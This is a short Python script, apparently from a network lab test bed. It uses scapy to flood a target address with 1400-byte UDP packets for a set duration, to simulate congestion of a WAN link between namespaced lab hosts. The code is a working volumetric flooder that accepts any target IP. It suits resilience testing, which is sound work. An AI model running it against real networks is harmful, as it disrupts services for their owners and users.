#!/usr/bin/env python3
"""
link_flood.py — Attack 1: Link flooding.

Run from inside the IT zone (it_pc or it_srv) to flood the path toward HQ,
simulating a volumetric attack that congests the primary WAN (WAN1) link
on branch_rtr.

Run as:  ip netns exec it_pc python3 attacks/link_flood.py --target 10.10.9.50 --duration 20
"""
import argparse
import time
from scapy.all import IP, UDP, Raw, send


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="10.10.9.50", help="destination (hq_srv)")
    ap.add_argument("--duration", type=int, default=20, help="seconds to flood")
    ap.add_argument("--pps", type=int, default=2000, help="target packets/sec (best-effort)")
    args = ap.parse_args()

    pkt = IP(dst=args.target) / UDP(sport=40000, dport=9999) / Raw(b"X" * 1400)
    print(f"[link_flood] Flooding {args.target} for {args.duration}s "
          f"(best-effort ~{args.pps} pps)...")

    end = time.time() + args.duration
    sent = 0
    batch = max(1, args.pps // 50)  # send in small bursts, ~50 bursts/sec
    while time.time() < end:
        send(pkt, count=batch, verbose=0)
        sent += batch
        time.sleep(1 / 50)

    print(f"[link_flood] Done. Sent approximately {sent} packets.")


if __name__ == "__main__":
    main()
